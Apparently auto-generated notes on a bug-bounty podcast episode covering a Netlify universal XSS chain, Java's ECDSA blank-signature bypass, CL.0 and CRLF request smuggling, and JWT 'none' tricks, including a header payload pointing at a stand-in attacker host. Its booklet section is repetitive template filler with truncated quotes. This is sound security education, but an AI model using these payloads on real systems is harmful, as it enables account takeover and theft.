---
title: "PortSwigger Top 10, TruffleSecurity Drama, and More!"
episode: 7
---


# Episode 7 PortSwigger Top 10, TruffleSecurity Drama, and More!

### TL;DR
- TruffleSecurity XSS Hunter controversy: stats logging → community backlash → end-to-end encryption added
- PortSwigger Top 10 Web Hacking Techniques 2022 — review of #10-#4
- Netlify Universal XSS by Sam Curry: open redirect → SSRF/XSS via IPX library → X-Forwarded-Proto header SSRF
- Java ECDSA signature verification bug: blank/zero signature validates because zero * anything = zero
- Hop-by-hop headers for HTTP request smuggling: Connection header can remove Content-Length for CL.0 smuggling
- URL-based request smuggling: injecting CRLF-encoded new request in URL path

### Key takeaways
- For open redirects: try backslashes, `//`, combinations of slashes; they may bypass regexes
- Netlify IPX: `/_ipx/w_200` path; X-Forwarded-Proto header SSRF that accepted full URLs
- Java 15-18 ECDSA: blank signature (all zeros) validates due to missing safety checks in C→Java migration
- Hop-by-hop headers: Connection + Content-Length headers can split a single request into two (CL.0 smuggling)
- CRLF injection in URL path (`%0d%0a`) can inject a second HTTP request
- Franz Rosen's postMessage tracker Chrome extension — essential for auditing postMessage handlers

### Bugs and Findings

#### Netlify Universal XSS — Open Redirect → SSRF → XSS
- **Target/context:** Netlify IPX image processing library; all Netlify-deployed static sites
- **Root cause:**
  1. Open redirect from path confusion
  2. SSRF via `_ipx` endpoint that fetches arbitrary URLs (SVG + XSS payload)
  3. Host whitelist bypass by chaining open redirect within whitelisted domain
  4. X-Forwarded-Proto header SSRF: full URL as protocol value truncates remainder with `?`
- **Technique / how found:** Sam Curry performed source code review of Netlify IPX; found `X-Forwarded-Proto` header parsed into request
- **Exploitation steps:**
  1. Find open redirect on whitelisted domain
  2. Use IPX endpoint with SVG URL that includes XSS payload
  3. If host is whitelisted, chain open redirect to reach attacker host
  4. Full universal XSS via `X-Forwarded-Proto: http://attacker.com/xss.svg?`
- **Key technical details:** `/_ipx/w_200` path; `X-Forwarded-Proto` header injects full URL; `?` truncates remaining path
- **Impact / severity / bounty:** Universal XSS on any Netlify static site — critical for Web3 (wallet draining)
- **Obstacles & how solved:** Host whitelist blocked arbitrary URLs; solved by chaining open redirect

#### Java ECDSA Signature Verification Bypass — CVE-2022-21449 (Psychic Signatures)
- **Target/context:** Java 15, 16, 17, 18 ECDSA implementation
- **Root cause:** ECDSA implementation was rewritten from C to Java; missing safety checks; blank signature (all zeros) validates because zero * anything = zero in the elliptic curve math
- **Technique / how found:** Researcher Neil Madden ran Project Wycheproof against Java's ECDSA; found blank signature validated
- **Key technical details:** Blank R and S values → zero multiplication → always valid; affects JWT, TLS, etc.
- **Impact / severity / bounty:** Authentication bypass in any system using Java ECDSA signatures (JWTs, TLS, etc.)
- **Obstacles & how solved:** Found via Project Wycheproof (Google's crypto test suite)

### Techniques and Primitives
- **Open redirect bypasses** — backslashes, `//`, combinations of characters to bypass regex
- **X-Forwarded-Proto header injection for SSRF** — provide full URL as protocol value, truncate with `#` or `?`
- **Hop-by-hop header smuggling** — use `Connection: Content-Length` to make proxy drop CL, enabling CL.0 smuggling
- **CRLF in URL path** — `%0d%0a` in URL to split into two HTTP requests
- **Project Wycheproof** — Google's systematic crypto test suite; run against any crypto library

### Tooling and Resources
- Project Wycheproof (Google)
- Franz Rosen's postMessage Tracker Chrome extension
- cookie-monster (Ian Carroll's tool for default crypto keys)
- jwt.io
- FeroxBuster (Rust-based content discovery, by J. Haddix)
- Caido HTML preview feature
- FFUF v2.0

### Suggestions and Advices from Hunter
- "Every time you see a JWT, try 'none' algorithm and empty/null signing key" — Justin
- "Read the documentation. Just read the freaking RFC" — on hop-by-hop headers
- "Open redirects: write them down, keep track, chain them" — Joel

### AI Takeaway
The hop-by-hop header smuggling technique is a powerful and underutilized CL.0 variant. The key RFC passage: any header listed in `Connection` gets stripped by the first proxy. This means you can remove `Content-Length`, `Transfer-Encoding`, or any custom header at the proxy boundary, enabling request splitting.
---

### 📘 Episode Booklet

#### 1. Episode in one sentence
TruffleSecurity XSS Hunter controversy: stats logging → community backlash → end-to-end encryption added

#### 2. What you should learn
- Understand **for open redirects: try backslashes, `//`, combinations of slashes; they may bypass regexes**
- Understand **netlify ipx: `/_ipx/w_200` path; x-forwarded-proto header ssrf that accepted full urls**
- Understand **java 15-18 ecdsa: blank signature (all zeros) validates due to missing safety checks in c→java migration**
- Understand **hop-by-hop headers: connection + content-length headers can split a single request into two (cl.0 smuggling)**
- Understand **crlf injection in url path (`%0d%0a`) can inject a second http request**

#### 3. Core concepts explained
**Netlify Universal XSS — Open Redirect → SSRF → XSS**
- **What it is:** Server-Side Request Forgery — the server makes HTTP requests on behalf of the attacker, reaching internal services, cloud metadata, or other resources not meant to be exposed.
- **Why it matters:** SSRF can lead to internal network scanning, cloud credential theft (AWS metadata at 169.254.169.254), and in some cases full RCE.
- **Common mistake:** Assuming SSRF is only about reading responses — even blind SSRF can be exploited via timing or out-of-band techniques.

**Java ECDSA Signature Verification Bypass — CVE-2022-21449 (Psychic Signatures)**
- This vulnerability class is discussed in the episode. Review the technical details for exploitation steps and mitigation strategies.

**Open redirect bypasses**
- backslashes, `//`, combinations of characters to bypass regex

**X-Forwarded-Proto header injection for SSRF**
- provide full URL as protocol value, truncate with `#` or `?`

**Hop-by-hop header smuggling**
- use `Connection: Content-Length` to make proxy drop CL, enabling CL.0 smuggling


#### 4. Techniques and tactics
**Open redirect bypasses**
- **What it is:** backslashes, `//`, combinations of characters to bypass regex
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**X-Forwarded-Proto header injection for SSRF**
- **What it is:** provide full URL as protocol value, truncate with `#` or `?`
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Hop-by-hop header smuggling**
- **What it is:** use `Connection: Content-Length` to make proxy drop CL, enabling CL.0 smuggling
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**CRLF in URL path**
- **What it is:** `%0d%0a` in URL to split into two HTTP requests
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.

**Project Wycheproof**
- **What it is:** Google's systematic crypto test suite; run against any crypto library
- **When to use it:** Apply this when testing targets with similar technology stacks or vulnerability patterns.
- **What can go wrong:** Technique may not work on all targets — adapt based on specific application behavior and WAF rules.


#### 5. Good Quotes
- *"Every time you see a JWT, try 'none' algorithm and empty/null signing key"* — **Justin**
- *"Read the documentation. Just read the freaking RFC"* — **on hop-by-hop headers**
- *"Open redirects: write them down, keep track, chain them"* — **Joel**

#### 6. Mental models
- **Every time you see a JWT, try 'none' algorithm and empty/nul** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Read the documentation. Just read the freaking RFC" — on hop** — This mindset helps you find bugs others miss by approaching the problem from a different angle.
- **Open redirects: write them down, keep track, chain them" — J** — This mindset helps you find bugs others miss by approaching the problem from a different angle.

#### 7. Real-world application
- **Try this:** For open redirects: try backslashes, `//`, combinations of slashes; they may bypass regexes
- **Try this:** Netlify IPX: `/_ipx/w_200` path; X-Forwarded-Proto header SSRF that accepted full URLs
- **Try this:** Java 15-18 ECDSA: blank signature (all zeros) validates due to missing safety checks in C→Java migration
- **Try this:** Hop-by-hop headers: Connection + Content-Length headers can split a single request into two (CL.0 smuggling)

#### 8. Red flags and pitfalls
- - Obstacles & how solved: Host whitelist blocked arbitrary URLs; solved by chaining open redirect
- - Obstacles & how solved: Found via Project Wycheproof (Google's crypto test suite)

#### 9. Vocabulary
- **SSRF** — Server-Side Request Forgery — server makes HTTP requests on attacker's behalf
- **XSS** — Cross-Site Scripting — injecting JavaScript into web pages viewed by other users

#### 10. Self-test
1. **Recall:** What is the root cause of the vulnerability in Netlify Universal XSS — Open Redirect → SSRF → XSS?
2. **Application:** If you found a similar pattern in a different application, what would your first test be?
3. **Reasoning:** Why is this technique effective against the target? What makes it work?
4. **Application:** How would you adapt this technique if the target had a WAF blocking obvious payloads?
5. **Recall:** Name three tools mentioned in this episode and their primary use case.
6. **Reasoning:** What obstacles might you encounter when applying these techniques in a real engagement?
7. **Application:** Design a testing workflow that combines multiple techniques from this episode.

#### 11. The practical takeaway
1. **TruffleSecurity XSS Hunter controversy: stats logging → community backlash → end**
2. **For open redirects: try backslashes, `//`, combinations of slashes; they may byp**
3. **Netlify IPX: `/_ipx/w_200` path; X-Forwarded-Proto header SSRF that accepted ful**
